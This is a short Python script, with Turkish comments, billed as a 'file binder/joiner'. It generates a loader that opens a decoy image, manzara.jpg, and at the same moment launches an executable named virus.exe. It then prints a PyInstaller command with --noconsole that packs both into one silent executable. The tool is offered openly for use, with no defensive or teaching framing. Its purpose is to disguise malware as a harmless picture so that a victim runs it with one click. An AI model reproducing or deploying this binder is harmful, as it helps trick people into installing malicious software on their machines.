import subprocess
import os

print("--- FILE BINDER / JOINER ---")
print("Bu araç iki dosyayı çalıştırılabilir tek bir dosyada birleştirir.")

# Birleştirilecek dosyalar (Klasöre koyman lazım)
file1 = "manzara.jpg" 
file2 = "virus.exe" # (Önceki projelerden bir exe olabilir)

# Python scripti oluşturacağız (Loader)
loader_code = f"""
import os
import sys
import subprocess

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Dosyaları aç
subprocess.Popen(resource_path('{file1}'), shell=True)
subprocess.Popen(resource_path('{file2}'), shell=True)
"""

with open("loader.py", "w") as f:
    f.write(loader_code)

print("\n✅ 'loader.py' oluşturuldu.")
print("Bunu PyInstaller ile '--add-data' kullanarak derlersen, tek tıkla ikisi de çalışır.")
print(f"Komut: pyinstaller --onefile --noconsole --add-data \"{file1};.\" --add-data \"{file2};.\" loader.py")